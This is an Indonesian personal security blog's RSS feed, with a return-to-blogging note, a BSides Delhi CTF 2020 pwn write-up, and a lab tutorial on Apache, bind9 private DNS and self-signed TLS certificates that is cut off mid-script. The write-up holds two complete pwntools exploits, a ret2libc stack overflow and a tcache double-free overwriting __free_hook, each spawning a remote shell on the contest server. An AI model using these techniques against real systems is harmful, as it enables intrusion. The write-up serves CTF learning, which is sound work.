            <title>I&#39;m Backkkk</title>
            <link>/posts/im-backkkk/</link>
            <pubDate>Mon, 25 Oct 2021 19:50:30 +0700</pubDate>
            
            <guid>/posts/im-backkkk/</guid>
            <description>0x00 Intro Yooooo, setelah hampir setaun lebih berhenti nge blog berhenti self research berhenti belajar karena sudah nyaman dapat kerja ehe ga ada motivasi lagi buat bersusah susah sudah nyaman :(, karena cewek juga entah ada apa dengan cewek, dan karena sempet seneng banget balik main dota 2 beberapa bulan ini karena dulu pas kuliah jarang banget nge game malah ctf an haha, akhirnya menuntut untuk puas puas in nge game sampe sampe bosen sendiri :( susah banget naikin rank (gw yg cupu kali).</description>
            <content type="html"><![CDATA[<h2 id="0x00-intro">0x00 Intro</h2>
<p>Yooooo, setelah hampir setaun lebih berhenti nge blog berhenti self research berhenti belajar karena sudah nyaman dapat kerja ehe ga ada motivasi lagi buat bersusah susah sudah nyaman :(, karena cewek juga entah ada apa dengan cewek, dan karena sempet seneng banget balik main dota 2 beberapa bulan ini karena dulu pas kuliah jarang banget nge game malah ctf an haha, akhirnya menuntut untuk puas puas in nge game sampe sampe bosen sendiri :( susah banget naikin rank (gw yg cupu kali).</p>
<p>Ya ya ya sehabis semua alasan alasan itu, entah kenapa ya pingin mbalik lagi self learning diluar urusan kantor aka DevSecOps, tapi selain alasan yg entah apa itu ada juga kok alasan pendukung nya, ya sertifikasi, Lets move to next step man, move to next level, masa iya stuck terus atau sudah berhenti belajar. Enggak puingin banget sih, tapi enggak apa lah, tidak ada salahnya kan punya sertifikasi.</p>
<p>Yah cukup sekian mungkin pesan singkat nya, doakan saya ya teman teman &lt;3 semoga betah dan bisa mencapainya dan yg jelas entah kapan itu bisa bermanfaat amin.</p>
<p><img src="/img/imback.jpg" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>Writeup PWN Bsides Delhi CTF 2020</title>
            <link>/posts/writeup-pwn-bsides-delhi-ctf-2020/</link>
            <pubDate>Sun, 11 Oct 2020 06:32:57 +0700</pubDate>
            
            <guid>/posts/writeup-pwn-bsides-delhi-ctf-2020/</guid>
            <description>Play Bsides Delhi CTF with Heroes Cyber Security, we have got 1st Place. Here for PWN Writeups
Thanks for Attending Binary Security Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Vuln int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // ebp  int v5; // [esp-28h] [ebp-28h]  int v6; // [esp-4h] [ebp-4h]  __asm { endbr32 } v6 = v3; sub_80490C0(stdin, 0, 2, 0); sub_80490C0(stdout, 0, 2, 0); sub_80490C0(stderr, 0, 2, 0); sub_80490A0(&amp;#34;It&amp;#39;s been fun, but here we are at the final challenge!</description>
            <content type="html"><![CDATA[<p>Play Bsides Delhi CTF with Heroes Cyber Security, we have got 1st Place. Here for PWN Writeups</p>
<h1 id="thanks-for-attending">Thanks for Attending</h1>
<h3 id="binary-security">Binary Security</h3>
<pre tabindex="0"><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre><h3 id="vuln">Vuln</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// ebp
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [esp-28h] [ebp-28h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [esp-4h] [ebp-4h]
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">__asm</span> { endbr32 }
  v6 <span style="color:#f92672">=</span> v3;
  sub_80490C0(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  sub_80490C0(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  sub_80490C0(stderr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  sub_80490A0(<span style="color:#e6db74">&#34;It&#39;s been fun, but here we are at the final challenge!&#34;</span>);
  sub_80490A0(<span style="color:#e6db74">&#34;May I know your name?&#34;</span>);
  sub_80490D0(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
  sub_8049090(<span style="color:#e6db74">&#34;It&#39;s been nice meeting you, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>When we see above code when reversing, we notice that the program input name on var v5 with scanf using <code>%s</code> argument. If program use <code>%s</code> for input, the program will take input without limiting the number of inputs. So with this vuln we can do Ret2libc and get shell.</p>
<h3 id="payload">Payload</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys

<span style="color:#75715e">#MyTemplate</span>
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)

lokal <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
<span style="color:#75715e">#context.arch = &#39;&#39;</span>

sla  <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendlineafter(delim,data)
ru   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :xp<span style="color:#f92672">.</span>recvuntil(delims, drop)
uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
<span style="color:#66d9ef">else</span>:
	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>

<span style="color:#66d9ef">if</span> lokal:
    xp <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path])
<span style="color:#66d9ef">else</span>:
    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;13.233.104.112&#39;</span>
    port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2222&#39;</span>
    xp <span style="color:#f92672">=</span> remote(host,port)

<span style="color:#66d9ef">if</span> Debug:
    context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    gdb<span style="color:#f92672">.</span>attach(xp,cmd)


<span style="color:#75715e">#Exploit Here</span>
puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
libcstart <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]

p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
p <span style="color:#f92672">+=</span> p32(puts)
p <span style="color:#f92672">+=</span> p32(main)
p <span style="color:#f92672">+=</span> p32(libcstart)

sla(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,p)
ru(<span style="color:#e6db74">&#34;!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
leak <span style="color:#f92672">=</span> uu32(xp<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4</span>))
print hex(leak)

libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18da0</span>
print libc<span style="color:#f92672">.</span>address

system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
binsh <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>next()

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
payload <span style="color:#f92672">+=</span> p32(system)
payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
payload <span style="color:#f92672">+=</span> p32(binsh)
sla(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)

xp<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>Flag : <code>BSDCTF{3xpl0r1ng_th3_unkn0wn}</code></p>
<h1 id="too-lazyyy">Too lazyyy</h1>
<h3 id="binary-security-1">Binary Security</h3>
<pre tabindex="0"><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre><h3 id="vuln-1">Vuln</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall deleteChunk<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">__asm</span> { endbr64 }
  v3 <span style="color:#f92672">=</span> a1;
  sub_1110(<span style="color:#e6db74">&#34;Enter index &gt;&gt; &#34;</span>);
  v2 <span style="color:#f92672">=</span> getInt(<span style="color:#e6db74">&#34;Enter index &gt;&gt; &#34;</span>);
  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>array[v2] )
  {
    sub_1110(<span style="color:#e6db74">&#34;Invalid&#34;</span>);
    sub_1170(<span style="color:#ae81ff">0LL</span>);
  }
  sub_10E0(array[v2]);
  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_10F0</span>(<span style="color:#e6db74">&#34;Success&#34;</span>);
}
</code></pre></div><p>Vuln is in function deleteChunk, it free chunk but not delete array chunk in bss, which mean this can make Use After Free and we can do Double Free for Arbitrary write.</p>
<ol>
<li>Add chunk with size 0x80 #0</li>
<li>Add chunk with size 0x18 #1 (to prevent consolidate with top chunk)</li>
<li>Delete chunk #0 8 time to fill tcache and get unsorted bin</li>
<li>Leak libc with view(0)</li>
<li>Do Double free on chunk #1</li>
<li>Arbitrary Write to __free_hook</li>
<li>Change with system or one_gadgets (my payload use one_gadgets)</li>
</ol>
<h3 id="payload-1">Payload</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys

<span style="color:#75715e">#MyTemplate</span>
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)

lokal <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
<span style="color:#75715e">#context.arch = &#39;&#39;</span>

sa   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendafter(delim,data)
sla  <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendlineafter(delim,data)
ru   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :xp<span style="color:#f92672">.</span>recvuntil(delims, drop)
uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
<span style="color:#66d9ef">else</span>:
	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>

<span style="color:#66d9ef">if</span> lokal:
    xp <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path])
<span style="color:#66d9ef">else</span>:
    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;13.233.104.112&#39;</span>
    port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1111&#39;</span>
    xp <span style="color:#f92672">=</span> remote(host,port)

<span style="color:#66d9ef">if</span> Debug:
    context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    gdb<span style="color:#f92672">.</span>attach(xp,cmd)


<span style="color:#75715e">#Exploit Here</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size,content):
	sla(<span style="color:#e6db74">&#34;Choice &gt;&gt; &#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>)
	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(size))
	sa(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
	sla(<span style="color:#e6db74">&#34;Choice &gt;&gt; &#34;</span>,<span style="color:#e6db74">&#34;2&#34;</span>)
	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
	sla(<span style="color:#e6db74">&#34;Choice &gt;&gt; &#34;</span>,<span style="color:#e6db74">&#34;3&#34;</span>)
	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(idx))

add(<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">&#34;A&#34;</span>)
add(<span style="color:#ae81ff">18</span>,<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
	free(<span style="color:#ae81ff">0</span>)

view(<span style="color:#ae81ff">0</span>)
ru(<span style="color:#e6db74">&#34;data:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
leaklibc <span style="color:#f92672">=</span>  uu64(xp<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
print hex(leaklibc)

libc <span style="color:#f92672">=</span> leaklibc <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebca0</span>
free_hook <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3ed8e8</span>
free(<span style="color:#ae81ff">1</span>)
free(<span style="color:#ae81ff">1</span>)
add(<span style="color:#ae81ff">0x18</span>,p64(libc<span style="color:#f92672">+</span>free_hook)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
add(<span style="color:#ae81ff">0x18</span>,p64(libc<span style="color:#f92672">+</span>free_hook)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
one <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f3c2</span>
add(<span style="color:#ae81ff">0x18</span>,p64(one))
free(<span style="color:#ae81ff">0</span>)

xp<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>Flag : <code>BSDCTF{Tcach3_1s_w4y_easi3r_than_f4stbins}</code></p>
]]></content>
        </item>
        
        <item>
            <title>Cewek Cowok Logika Dan Perasaan</title>
            <link>/posts/cewek-cowok-logika-dan-perasaan/</link>
            <pubDate>Tue, 31 Mar 2020 00:20:10 +0700</pubDate>
            
            <guid>/posts/cewek-cowok-logika-dan-perasaan/</guid>
            <description></description>
            <content type="html"><![CDATA[<!-- raw HTML omitted -->
]]></content>
        </item>
        
        <item>
            <title>[LAB] Install Web Server With Private DNS and Secure With HTTPS</title>
            <link>/posts/lab-install-web-server-with-private-dns-and-secure-with-https/</link>
            <pubDate>Wed, 16 Oct 2019 09:09:46 +0700</pubDate>
            
            <guid>/posts/lab-install-web-server-with-private-dns-and-secure-with-https/</guid>
            <description>0x0 Intro Sebelumnya saya jelaskan tujuan dari lab ini, yaitu kita membuat web server disini saya menggunakan apache, lalu Install bind9 untuk dns server dan membuat domain private kita sendiri, setelah bisa kita secure dengan HTTPS caranya dengan self signed certificate.
Sebelumnya siapkan server yang akan kita gunakan, lalu pahami design jaringan dari server anda, disini saya menggunakan pengaturan network bridge dan menggunakan koneksi dari WIFI B201AP.
IP server : 10.</description>
            <content type="html"><![CDATA[<h3 id="0x0-intro">0x0 Intro</h3>
<p>Sebelumnya saya jelaskan tujuan dari lab ini, yaitu kita membuat web server disini saya menggunakan apache, lalu Install bind9 untuk dns server dan membuat domain private kita sendiri, setelah bisa kita secure dengan HTTPS caranya dengan self signed certificate.</p>
<p>Sebelumnya siapkan server yang akan kita gunakan, lalu pahami design jaringan dari server anda, disini saya menggunakan pengaturan network bridge dan menggunakan koneksi dari WIFI B201AP.</p>
<p>IP server : 10.122.1.70
IP laptop : 10.122.1.53</p>
<p>silakan gunakan design jaringan kalian sendiri.</p>
<h3 id="0x1-install-web-server">0x1 Install Web Server</h3>
<p>Web server yang saya gunakan adalah apache2, untuk install gunakan command berikut :</p>
<pre><code> $ sudo apt-get install apache2
</code></pre>
<p>setelah selesai, tanpa disetting apapun harusnya jika dibuka ip anda disini saya (10.122.1.70) sudah menampilkan web apache.</p>
<p>untuk mengganti isi web, dapat di replace file di /var/www/html, disini saya mengganti default index.html dengan web saya, berikut hasilnya :</p>
<p><img src="/img/webj1.png" alt=""></p>
<h3 id="0x2-install-private-dns">0x2 Install Private DNS</h3>
<p>Untuk menggunakan Private DNS saya menggunakan service bind9, dan membuat DNS di ip server yaitu 10.122.1.70</p>
<p>Bind9 adalah suatu software yang di buat untuk mengatur DNS Server pada sistem operasi linux.</p>
<p>Jenis-jenis DNS dan Fungsinya</p>
<ol>
<li>A Record, yaitu memetakan hostname ke IP adress 32-bit (IPv4).</li>
<li>AAA Record, yaitu memetakan hostname ke IP address 128-bit (IPv6).</li>
<li>MX Record, memetakan domain ke mail exchange server.</li>
<li>CNAME Record, membuat nama alias dari sebuah domain.</li>
<li>NS Record, memtakan domain ke dalam satu daftar dari DNS Server.</li>
</ol>
<p>Untuk membuat domain kita sendiri, ada 3 hal yang harus kita lakukan :</p>
<ol>
<li>Configuring the Local File</li>
<li>Creating the Forward Zone File</li>
<li>Creating the Reverse Zone File(s)</li>
</ol>
<p>Selanjutnya kita mulai proses install dan konfigurasinya.</p>
<ul>
<li>
<p>install dulu bind9 nya :</p>
<p>$  sudo apt-get install bind9</p>
</li>
<li>
<p>Selanjutnya configure local file</p>
<pre><code>$  sudo vim /etc/bind/named.conf.local
</code></pre>
</li>
</ul>
<pre tabindex="0"><code>//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include &quot;/etc/bind/zones.rfc1918&quot;;

zone &quot;ditoprabowo.com&quot; {
type master;
file &quot;/etc/bind/zones/ditoprabowo.com.db&quot;;
};

zone &quot;1.122.10.in-addr.arpa&quot; {
type master;
file &quot;/etc/bind/zones/rev.1.122.10.in-addr.arpa&quot;;
};
</code></pre><p>1.122.10 merupakan 3 digit 10.122.1.70 yang dibalik.</p>
<ul>
<li>
<p>Buat directory folder zones &amp; file di domain.com.db di directory /etc/bind [Forward Zone]</p>
<pre><code>    $  cd /etc/bind
    $  sudo mkdir zones
    $  cd zones
    $  vim ditoprabowo.com.db
</code></pre>
</li>
</ul>
<pre tabindex="0"><code>; BIND data file for ditoprabowo.com
;
$TTL 14400
@ IN SOA ns1.ditoprabowo.com. root.ditoprabowo.com. (
1 ; Serial  
7200 ; Refresh  
120 ; Retry
2419200 ; Expire  
604800) ; Default TTL  
;

ditoprabowo.com. IN NS ns1.ditoprabowo.com.
ditoprabowo.com. IN MX 10 testing.ditoprabowo.com.
ditoprabowo.com. IN A 10.122.1.70

ns1 IN A 10.122.1.70

www IN CNAME ditoprabowo.com.
testing IN A 10.122.1.70
ftp IN CNAME ditoprabowo.com.
ditoprabowo.com. IN TXT &quot;v=spf1 ip4:10.122.1.70 a mx ~all&quot;
testing IN TXT &quot;v=spf1 a -all&quot;
</code></pre><ul>
<li>
<p>Creating the Reverse Zone File(s)</p>
<pre><code>  $  sudo vim /etc/bind/zones/1.122.10.in-addr.arpa
</code></pre>
</li>
</ul>
<pre tabindex="0"><code>@ IN SOA ditoprabowo.com. root.ditoprabowo.com. (
1;  
28800;  
604800;  
604800;  
86400 );

@ IN NS ns1.ditoprabowo.com.  
70 IN PTR ditoprabowo.com.
</code></pre><p>ganti 70 dengan akhiran ip kalian. test dengan nslookup.</p>
<ul>
<li>
<p>lalu kita coba test domain kita, caranya dengan menggunakan nameserver ip dns kita.</p>
<pre><code>  $  sudo vim /etc/resolv.conf
</code></pre>
</li>
</ul>
<pre tabindex="0"><code>nameserver 10.122.1.70
</code></pre><p>hasilnya :</p>
<pre tabindex="0"><code>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.9-Ubuntu &lt;&lt;&gt;&gt; ditoprabowo.com
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45338
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: a631a242020ee04e76887a075da68f41f580d1ab13c184ba (good)
;; QUESTION SECTION:
;ditoprabowo.com.		IN	A

;; ANSWER SECTION:
ditoprabowo.com.	14400	IN	A	10.122.1.70

;; AUTHORITY SECTION:
ditoprabowo.com.	14400	IN	NS	ns1.ditoprabowo.com.

;; ADDITIONAL SECTION:
ns1.ditoprabowo.com.	14400	IN	A	10.122.1.70

;; Query time: 0 msec
;; SERVER: 10.122.1.70#53(10.122.1.70)
;; WHEN: Wed Oct 16 03:32:17 UTC 2019
;; MSG SIZE  rcvd: 122
</code></pre><p>Testing pada selain server, gunakan dns ip server.</p>
<p>configure dulu dns pada wifi, lalu coba buka ditoprabowo.com</p>
<p><img src="/img/webj2.png" alt=""></p>
<p><img src="/img/webj3.png" alt=""></p>
<h3 id="0x3-secure-with-https">0x3 Secure With HTTPS</h3>
<p><img src="/img/SSL-flowchart.png" alt=""></p>
<p>nah kita bisa menggenerate certificate sendiri (Self-signed certificate) dengan openssl</p>
<ol>
<li>Generate a certificate authority (CA) cert</li>
<li>Generate your Apache server SSL key and certificate</li>
<li>Generate a client SSL certificate</li>
</ol>
<p>dan pada saat membuat server key jangan lupa ditambahkan DNS kita.</p>
<p>Berikut script yang saya gunakan untuk Generate self-signed TLS Certificate yang isinya sebenernya seperti diatas step nya.</p>
<pre tabindex="0"><code>#!/bin/bash

# Directories
cur=$(pwd)
tmp=$(mktemp -d)
scriptName=$(basename &quot;$0&quot;)

# Certificate Variables
OUTPATH=&quot;./&quot;
VERBOSE=0
DURATION=3650 # 10 years

safeExit() {
  if [ -d &quot;$tmp&quot; ]; then
    if [ $VERBOSE -eq 1 ]; then
      echo &quot;Removing temporary directory '${tmp}'&quot;
    fi
    rm -rf &quot;$tmp&quot;
  fi

  trap - INT TERM EXIT
  exit
}

# Help Screen
help() {
  echo -n &quot;${scriptName} [OPTIONS] -c=US --state=California
Generate self-signed TLS certificate using OpenSSL
 Options:
  -c|--country         Country Name (2 letter code)
  -s|--state           State or Province Name (full name)
  -l|--locality        Locality Name (eg, city)
  -o|--organization    Organization Name (eg, company)
  -u|--unit            Organizational Unit Name (eg, section)
  -n|--common-name     Common Name (e.g. server FQDN or YOUR name)
  -e|--email           Email Address
  -p|--path            Path to output generated keys
  -d|--duration        Validity duration of the certificate (in days)
  -h|--help            Display this help and exit
  -v|--verbose         Verbose output
&quot;
}

# Test output path is valid
testPath() {
  if [ ! -d $OUTPATH ]; then
    echo &quot;The specified directory \&quot;${OUTPATH}\&quot; does not exist&quot;
    exit 1
  fi
}

# Process Arguments
while [ &quot;$1&quot; != &quot;&quot; ]; do
  PARAM=$(echo &quot;$1&quot; | awk -F= '{print $1}')
  VALUE=$(echo &quot;$1&quot; | awk -F= '{print $2}')
  case $PARAM in
    -h|--help) help; safeExit ;;
    -c|--country) C=$VALUE ;;
    -s|--state) ST=$VALUE ;;
    -l|--locality) L=$VALUE ;;
    -o|--organization) O=$VALUE ;;
    -u|--unit) OU=$VALUE ;;
    -n|--common-name) CN=$VALUE ;;
    -e|--email) emailAddress=$VALUE ;;
    -p|--path) OUTPATH=$VALUE; testPath ;;
	-d|--duration) DURATION=$VALUE ;;
    -v|--verbose) VERBOSE=1 ;;
    *) echo &quot;ERROR: unknown parameter \&quot;$PARAM\&quot;&quot;; help; exit 1 ;;
  esac
  shift
done

# Prompt for variables that were not provided in arguments
checkVariables() {
  # Country
  if [ -z &quot;$C&quot; ]; then
    echo -n &quot;Country Name (2 letter code) [AU]:&quot;
    read -r C
  fi

  # State
  if [ -z &quot;$ST&quot; ]; then
    echo -n &quot;State or Province Name (full name) [Some-State]:&quot;
    read -r ST
  fi

  # Locality
  if [ -z &quot;$L&quot; ]; then
    echo -n &quot;Locality Name (eg, city) []:&quot;
    read -r L
  fi

  # Organization
  if [ -z &quot;$O&quot; ]; then
    echo -n &quot;Organization Name (eg, company) [Internet Widgits Pty Ltd]:&quot;
    read -r O
  fi

  # Organizational Unit
  if [ -z &quot;$OU&quot; ]; then
    echo -n &quot;Organizational Unit Name (eg, section) []:&quot;
    read -r OU
  fi

  # Common Name
  if [ -z &quot;$CN&quot; ]; then
    echo -n &quot;Common Name (e.g. server FQDN or YOUR name) []:&quot;
    read -r CN
  fi

  # Email Address
  if [ -z &quot;$emailAddress&quot; ]; then
    echo -n &quot;Email Address []:&quot;
    read -r emailAddress
  fi
}

# Show variable values
showVals() {
  echo &quot;Country: ${C}&quot;;
  echo &quot;State: ${ST}&quot;;
  echo &quot;Locality: ${L}&quot;;
  echo &quot;Organization: ${O}&quot;;
  echo &quot;Organization Unit: ${OU}&quot;;
  echo &quot;Common Name: ${CN}&quot;;
  echo &quot;Email: ${emailAddress}&quot;;
  echo &quot;Output Path: ${OUTPATH}&quot;;
  echo &quot;Certificate Duration (Days): ${DURATION}&quot;;
  echo &quot;Verbose: ${VERBOSE}&quot;;
}

# Init
init() {
  cd &quot;$tmp&quot; || exit
  pwd
}

# Cleanup
cleanup() {
  echo &quot;Cleaning up&quot;
  cd &quot;$cur&quot; || exit
  rm -rf &quot;$tmp&quot;
}

buildCsrCnf() {
cat &lt;&lt; EOF &gt; &quot;${tmp}/tmp.csr.cnf&quot;
[req]
default_bits = 2048
prompt = no
default_md = sha256
distinguished_name = dn
[dn]
C=${C}
ST=${ST}
L=${L}
O=${O}
OU=${OU}
CN=${CN}
emailAddress=${emailAddress}
EOF
}

buildExtCnf() {
cat &lt;&lt; EOF &gt; &quot;${tmp}/v3.ext&quot;
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names
[alt_names]
DNS.1 = ${CN}
DNS.2 = ditoprabowo.com
DNS.3 = ns1.ditoprabowo.com
